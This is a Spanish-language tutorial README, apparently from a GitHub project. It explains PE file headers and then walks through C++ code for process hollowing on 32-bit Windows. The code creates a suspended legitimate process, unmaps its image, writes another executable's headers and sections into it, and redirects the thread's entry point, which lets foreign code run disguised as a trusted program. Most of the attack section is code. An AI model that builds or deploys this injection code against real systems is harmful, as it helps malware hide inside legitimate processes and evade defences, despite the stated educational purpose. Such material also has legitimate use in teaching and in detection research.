# Antes que nada , debemos comprender lo siguiente

1. **Trabajaremos con archivos PE de Windows**
2. **Hablaremos de MS-DOS y DOS**:
   - MS-DOS, o Microsoft Disk Operating System, fue un sistema operativo desarrollado por Microsoft para computadoras personales ([Wikipedia](https://es.wikipedia.org/wiki/MS-DOS))

_________________________________________________________________________________________________________

Primer Paso: Comprender los PE files
Portable Executable (PE) es un formato de archivo para archivos ejecutables, de código objeto, bibliotecas de enlace dinámico (DLL), archivos de fuentes FON​ y otros usados en versiones de 32 bit y 64 bit del sistema operativo Microsoft Windows segun Wikipedia
Estos archivos contienen una estructura que deberemos entender perfectamente para entender esta tecnica:

![image](https://github.com/user-attachments/assets/a45643a9-ecc8-4933-899a-dda9781e5931)
A continuacion , procederemos a explicar cada uno

###Encabezado DOS
Este encabezado es una estructura de 64 bits que existe al principio de todos los PE Files, Este no es importante en sistemas Windows modernos pero se sigue incluyendo por razones de compatibilidad con versiones anteriores.
Esta cabecera convierte el archivo en un ejecutable MS-DOS, de modo que cuando se carga en MS-DOS se ejecuta el stub DOS en lugar del programa real.
Sin esta cabecera, si intenta cargar el ejecutable en MS-DOS no se cargará y sólo producirá un error genérico.

##Estructura
![image](https://github.com/user-attachments/assets/4eb708c2-d37d-4e26-979a-bc24c1c5172c)
Esta estructura es importante para el cargador PE en MS-DOS, sin embargo sólo unos pocos miembros de la misma son importantes para el cargador PE en sistemas Windows, por lo que no vamos a cubrir todo aquí, sólo los miembros importantes de la estructura.

* e_magic: Es el primer miembro de la Cabecera DOS, es un WORD por lo que ocupa 2 bytes, se le suele llamar número mágico. Tiene un valor fijo de 0x5A4D o MZ en ASCII, y sirve como firma que marca el fichero como ejecutable MS-DOS.
* e_lfanew: Este es el último miembro de la estructura de cabecera del DOS, se encuentra en el offset 0x3C dentro de la cabecera del DOS y contiene un offset al inicio de las cabeceras NT. Este miembro es importante para el cargador PE en sistemas Windows porque le dice al cargador dónde buscar la cabecera del archivo.

![image](https://github.com/user-attachments/assets/669dcc0d-c8ef-4114-87a0-ea86c9c902b3)

Como puedes ver, el primer miembro de la cabecera es el número mágico con el valor fijo del que hablamos que era 5A4D.
El último miembro de la cabecera (en el offset 0x3C) recibe el nombre de «File address of new exe header», tiene el valor 100, podemos seguir hasta ese offset y encontraremos el inicio de las cabeceras NT como era de esperar:

###Dos Stub
El stub de DOS es un programa de MS-DOS que imprime un mensaje de error diciendo que el ejecutable no es compatible con DOS y luego sale.
Esto es lo que se ejecuta cuando el programa se carga en MS-DOS, el mensaje de error por defecto es «Este programa no puede ejecutarse en modo DOS», sin embargo este mensaje puede ser cambiado por el usuario durante el tiempo de compilación.

Eso es todo lo que necesitamos saber sobre el stub DOS, realmente no nos importa, pero echemos un vistazo a lo que hace.





### 1. Cabeceras y Definiciones de Tipos Requeridas

```cpp
#include <windows.h>
#include <iostream>
#include <string>

typedef struct BASE_RELOCATION_BLOCK {
    DWORD PageAddress;
    DWORD BlockSize;
} BASE_RELOCATION_BLOCK, *PBASE_RELOCATION_BLOCK;

typedef struct BASE_RELOCATION_ENTRY {
    USHORT Offset : 12;
    USHORT Type : 4;
} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;

typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(
    HANDLE ProcessHandle,
    PVOID BaseAddress
);
```

- `windows.h`: Proporciona acceso a las funciones de la API de Windows
- `iostream` y `string`: Para entrada/salida estándar y manipulación de cadenas
- `BASE_RELOCATION_BLOCK` y `BASE_RELOCATION_ENTRY`: Estructuras para manejar relocalizaciones de PE
- `pNtUnmapViewOfSection`: Prototipo de función para la función no documentada NtUnmapViewOfSection

### 2. Función de Manejo de Errores

```cpp
void ErrorExit(const char* message) {
    std::cerr << message << " Error: " << GetLastError() << std::endl;
    exit(1);
}
```

Esta función de utilidad muestra un mensaje de error junto con el código de error de Windows y sale del programa.

### 3. Lectura del Archivo Fuente

```cpp
HANDLE sourceFile = CreateFileA(sourceProcess.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
```

- `CreateFileA`: Abre un archivo o dispositivo de E/S
  - `sourceProcess.c_str()`: Ruta al archivo (convertida a cadena estilo C)
  - `GENERIC_READ`: Solicita acceso de lectura
  - `FILE_SHARE_READ`: Permite a otros procesos leer el archivo mientras lo tenemos abierto
  - `NULL`: Atributos de seguridad predeterminados
  - `OPEN_EXISTING`: Abre el archivo solo si existe
  - `0`: Sin atributos especiales
  - `NULL`: Sin archivo de plantilla

```cpp
DWORD sourceFileSize = GetFileSize(sourceFile, NULL);
```

- `GetFileSize`: Recupera el tamaño del archivo en bytes
  - `sourceFile`: Handle al archivo
  - `NULL`: No necesitamos la palabra doble de orden superior del tamaño del archivo (para archivos mayores de 4GB)

```cpp
LPVOID sourceFileBytesBuffer = HeapAlloc(GetProcessHeap(), 0, sourceFileSize);
```

- `HeapAlloc`: Asigna memoria del heap (montón) del proceso
  - `GetProcessHeap()`: Obtiene el heap predeterminado del proceso
  - `0`: Sin flags especiales de asignación
  - `sourceFileSize`: Número de bytes a asignar

```cpp
if (!ReadFile(sourceFile, sourceFileBytesBuffer, sourceFileSize, &bytesRead, NULL)) {
    ErrorExit("No se pudo leer el archivo fuente");
}
```

- `ReadFile`: Lee datos de un archivo
  - `sourceFile`: Handle al archivo
  - `sourceFileBytesBuffer`: Buffer para recibir los datos
  - `sourceFileSize`: Número de bytes a leer
  - `&bytesRead`: Variable que recibirá el número de bytes realmente leídos
  - `NULL`: Sin estructura superpuesta (E/S síncrona)

### 4. Análisis de Cabeceras PE

```cpp
PIMAGE_DOS_HEADER sourceImageDOSHeader = (PIMAGE_DOS_HEADER)sourceFileBytesBuffer;
PIMAGE_NT_HEADERS sourceImageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)sourceFileBytesBuffer + sourceImageDOSHeader->e_lfanew);
```

- `PIMAGE_DOS_HEADER`: Puntero a la estructura de cabecera DOS al principio de un archivo PE
- `e_lfanew`: Campo en la cabecera DOS que da el desplazamiento a la cabecera PE
- `PIMAGE_NT_HEADERS`: Puntero a las cabeceras NT que contienen información esencial sobre el archivo PE
  - Contiene `FileHeader` con tipo de máquina, número de secciones, etc.
  - Contiene `OptionalHeader` con punto de entrada, base de imagen, alineación de sección, etc.

### 5. Creación de un Proceso Suspendido

```cpp
STARTUPINFOA startupInfo;
PROCESS_INFORMATION processInfo;
    
ZeroMemory(&startupInfo, sizeof(startupInfo));
ZeroMemory(&processInfo, sizeof(processInfo));
startupInfo.cb = sizeof(startupInfo);
```

- `STARTUPINFOA`: Estructura que especifica la estación de ventana, escritorio, handles estándar y apariencia de la ventana principal para un nuevo proceso
- `PROCESS_INFORMATION`: Estructura que recibe información de identificación sobre el nuevo proceso
- `ZeroMemory`: Llena la memoria con ceros (inicializa todos los campos a 0)
- `startupInfo.cb`: Tamaño de la estructura (requerido por CreateProcess)

```cpp
if (!CreateProcessA(
    targetProcess.c_str(),
    NULL,
    NULL,
    NULL,
    FALSE,
    CREATE_SUSPENDED,
    NULL,
    NULL,
    &startupInfo,
    &processInfo
)) {
    ErrorExit("No se pudo crear el proceso legítimo");
}
```

- `CreateProcessA`: Crea un nuevo proceso y su hilo primario
  - `targetProcess.c_str()`: Ruta al ejecutable (proceso legítimo)
  - `NULL`: Sin argumentos de línea de comandos
  - `NULL` (3er y 4to parámetros): Atributos de seguridad predeterminados
  - `FALSE`: No heredar handles
  - `CREATE_SUSPENDED`: Crear el proceso en estado suspendido (crítico para el hollowing)
  - `NULL` (7mo y 8vo parámetros): Usar el entorno y directorio actual del padre
  - `&startupInfo`: Puntero a la estructura STARTUPINFO
  - `&processInfo`: Puntero a la estructura PROCESS_INFORMATION para recibir info sobre el nuevo proceso

### 6. Obtención de Información del Proceso

```cpp
CONTEXT context;
context.ContextFlags = CONTEXT_FULL;
    
if (!GetThreadContext(processInfo.hThread, &context)) {
    ErrorExit("No se pudo obtener el contexto del hilo");
}
```

- `CONTEXT`: Estructura que contiene datos de registro específicos del procesador
- `ContextFlags = CONTEXT_FULL`: Solicita todos los valores de registro
- `GetThreadContext`: Recupera el contexto (valores de registro) del hilo especificado

```cpp
DWORD pebAddress = context.Ebx;
```

- En sistemas x86 (32 bits), el registro EBX apunta al Process Environment Block (PEB)

```cpp
if (!ReadProcessMemory(
    processInfo.hProcess,
    (LPVOID)(pebAddress + 8),
    &imageBaseAddress,
    sizeof(LPVOID),
    &bytesRead2
)) {
    ErrorExit("No se pudo leer la dirección base del proceso");
}
```

- `ReadProcessMemory`: Lee datos de la memoria de otro proceso
  - `processInfo.hProcess`: Handle al proceso objetivo
  - `(LPVOID)(pebAddress + 8)`: Dirección de donde leer (PEB+8 contiene la dirección base de la imagen en x86)
  - `&imageBaseAddress`: Buffer para recibir los datos
  - `sizeof(LPVOID)`: Número de bytes a leer
  - `&bytesRead2`: Variable para recibir el número de bytes leídos

### 7. Desmapeo del Código Original

```cpp
HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(
    hNtdll, 
    "NtUnmapViewOfSection"
);
```

- `GetModuleHandleA`: Obtiene un handle a un módulo cargado (DLL)
- `GetProcAddress`: Obtiene la dirección de una función en una DLL
  - Esto es necesario porque `NtUnmapViewOfSection` no está documentada en la API de Windows

```cpp
NTSTATUS status = NtUnmapViewOfSection(
    processInfo.hProcess,
    imageBaseAddress
);
```

- `NtUnmapViewOfSection`: Desmapea una vista de una sección del espacio de dirección virtual de un proceso
  - Esta es la parte de "hollowing" - elimina el código original

```cpp
if (status != 0) {
    // Intenta un método alternativo
    if (!VirtualFreeEx(
        processInfo.hProcess,
        imageBaseAddress,
        0,
        MEM_RELEASE
    )) {
        // Continúa de todos modos
    }
}
```

- `VirtualFreeEx`: Método alternativo para liberar memoria en otro proceso
  - Se usa como fallback si `NtUnmapViewOfSection` falla

### 8. Asignación de Nueva Memoria

```cpp
LPVOID newBaseAddress = VirtualAllocEx(
    processInfo.hProcess,
    (LPVOID)(sourceImageNTHeaders->OptionalHeader.ImageBase),
    sourceImageNTHeaders->OptionalHeader.SizeOfImage,
    MEM_COMMIT | MEM_RESERVE,
    PAGE_EXECUTE_READWRITE
);
```

- `VirtualAllocEx`: Reserva o compromete memoria en el espacio de direcciones virtual de otro proceso
  - `processInfo.hProcess`: Handle al proceso objetivo
  - `(LPVOID)(sourceImageNTHeaders->OptionalHeader.ImageBase)`: Dirección base preferida del archivo PE
  - `sourceImageNTHeaders->OptionalHeader.SizeOfImage`: Tamaño de memoria a asignar
  - `MEM_COMMIT | MEM_RESERVE`: Asignar y comprometer la memoria
  - `PAGE_EXECUTE_READWRITE`: Permisos de memoria (lectura, escritura, ejecución)

```cpp
if (!newBaseAddress) {
    // Intenta de nuevo con dirección NULL (deja que Windows decida)
    newBaseAddress = VirtualAllocEx(
        processInfo.hProcess,
        NULL,
        sourceImageNTHeaders->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
}
```

- Si la asignación en la dirección preferida falla, intenta asignar en cualquier lugar de la memoria
- Esto puede requerir ajustar referencias en el código (relocalizaciones)

### 9. Escritura de Cabeceras PE

```cpp
if (!WriteProcessMemory(
    processInfo.hProcess,
    newBaseAddress,
    sourceFileBytesBuffer,
    sourceImageNTHeaders->OptionalHeader.SizeOfHeaders,
    NULL
)) {
    ErrorExit("No se pudieron escribir las cabeceras PE");
}
```

- `WriteProcessMemory`: Escribe datos en la memoria de otro proceso
  - `processInfo.hProcess`: Handle al proceso objetivo
  - `newBaseAddress`: Dirección destino
  - `sourceFileBytesBuffer`: Buffer fuente (inicio del archivo PE)
  - `sourceImageNTHeaders->OptionalHeader.SizeOfHeaders`: Número de bytes a escribir (solo las cabeceras)
  - `NULL`: No necesitamos saber cuántos bytes se escribieron

### 10. Escritura de Secciones PE

```cpp
PIMAGE_SECTION_HEADER sourceImageSectionHeader = (PIMAGE_SECTION_HEADER)(
    (DWORD_PTR)sourceImageNTHeaders + sizeof(IMAGE_NT_HEADERS)
);
```

- Calcula la dirección de la primera cabecera de sección, que viene justo después de las cabeceras NT

```cpp
for (int i = 0; i < sourceImageNTHeaders->FileHeader.NumberOfSections; i++) {
    LPVOID sectionDestination = (LPVOID)(
        (DWORD_PTR)newBaseAddress + sourceImageSectionHeader->VirtualAddress
    );
    
    LPVOID sectionSource = (LPVOID)(
        (DWORD_PTR)sourceFileBytesBuffer + sourceImageSectionHeader->PointerToRawData
    );
    
    if (!WriteProcessMemory(
        processInfo.hProcess,
        sectionDestination,
        sectionSource,
        sourceImageSectionHeader->SizeOfRawData,
        NULL
    )) {
        ErrorExit("No se pudo escribir la sección PE");
    }
    
    sourceImageSectionHeader++;
}
```

- Itera a través de cada sección del archivo PE (como .text, .data, .rdata)
- Para cada sección:
  - Calcula la dirección de destino en el proceso objetivo
  - Calcula la dirección fuente en nuestro buffer
  - Escribe los datos de la sección en el proceso objetivo
  - Avanza a la siguiente cabecera de sección

### 11. Actualización del Contexto del Hilo

```cpp
context.Eax = (DWORD_PTR)newBaseAddress + sourceImageNTHeaders->OptionalHeader.AddressOfEntryPoint;
```

- En sistemas x86, el registro EAX contiene la dirección del punto de entrada cuando un hilo comienza
- Establece EAX para que apunte al punto de entrada de nuestro código inyectado

```cpp
if (!SetThreadContext(processInfo.hThread, &context)) {
    ErrorExit("No se pudo establecer el contexto del hilo");
}
```

- `SetThreadContext`: Actualiza el contexto (valores de registro) del hilo especificado
  - Esto redirige la ejecución a nuestro código inyectado

### 12. Reanudación de la Ejecución

```cpp
if (ResumeThread(processInfo.hThread) == -1) {
    ErrorExit("No se pudo reanudar el hilo");
}
```

- `ResumeThread`: Decrementa el contador de suspensión de un hilo, lo que reanuda la ejecución si el contador llega a cero
  - El hilo ahora comenzará a ejecutar nuestro código inyectado

### 13. Limpieza

```cpp
HeapFree(GetProcessHeap(), 0, sourceFileBytesBuffer);
CloseHandle(processInfo.hProcess);
CloseHandle(processInfo.hThread);
```

- `HeapFree`: Libera memoria asignada por HeapAlloc
- `CloseHandle`: Cierra handles abiertos al proceso y al hilo

## Detalles Técnicos

### Estructura de Archivos PE

Un archivo Portable Executable (PE) consiste en:

1. **Cabecera DOS**: Contiene la famosa firma "MZ" y el campo e_lfanew que apunta a las cabeceras NT
2. **Cabeceras NT**:
   - Firma ("PE\0\0")
   - Cabecera de Archivo: Tipo de máquina, número de secciones, etc.
   - Cabecera Opcional: Punto de entrada, base de imagen, alineación de sección, etc.
3. **Cabeceras de Sección**: Información sobre cada sección (.text, .data, etc.)
4. **Secciones**: El código y datos reales

### Diseño de Memoria del Proceso

Cuando Windows carga un archivo PE:

1. Crea un espacio de direcciones virtuales para el proceso
2. Mapea el archivo PE en memoria según las cabeceras de sección
3. Aplica relocalizaciones si es necesario
4. Resuelve importaciones
5. Configura el Process Environment Block (PEB)
6. Crea un hilo que comienza en el punto de entrada

Process Hollowing modifica este diseño:
1. Creando el proceso pero sin dejarlo correr
2. Desmapeando el código original
3. Mapeando un archivo PE diferente en el mismo proceso
4. Redirigiendo la ejecución al nuevo punto de entrada

## Limitaciones y Consideraciones

1. **Arquitectura**: Este código está dirigido a procesos de 32 bits (x86). Para procesos de 64 bits (x64), necesitas ajustar el acceso a registros (usar RCX en lugar de EAX para el punto de entrada).

2. **Relocalizaciones**: Si el código inyectado no puede cargarse en su dirección base preferida, es necesario procesar las relocalizaciones.

3. **Importaciones**: El código no resuelve importaciones en el ejecutable inyectado, asumiendo que ya están resueltas.

4. **Seguridad**: Los sistemas Windows modernos tienen protecciones como ASLR, DEP e Integridad de Código que pueden prevenir esta técnica.

5. **Compatibilidad**: El proceso inyectado debe ser compatible con el proceso legítimo (misma arquitectura, subsistema, etc.).

## Propósito Educativo

Este código se proporciona con fines educativos para entender:
- Creación de procesos de Windows y gestión de memoria
- Estructura y carga de archivos PE
- Contextos de hilos y redirección de ejecución
- APIs de Windows de bajo nivel

## Licencia

Este proyecto está licenciado bajo la Licencia MIT - ver el archivo LICENSE para más detalles.
